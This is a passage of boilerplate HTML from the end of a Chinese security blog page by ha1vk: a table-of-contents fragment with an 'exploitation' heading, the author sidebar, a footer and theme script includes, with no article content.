class="nav-text">漏洞利用</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E6%84%9F%E6%83%B3"><span class="nav-number">6.</span> <span class="nav-text">0x05 感想</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">ha1vk</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">233</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">145</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">ha1vk</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>


        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

</body>
</html>
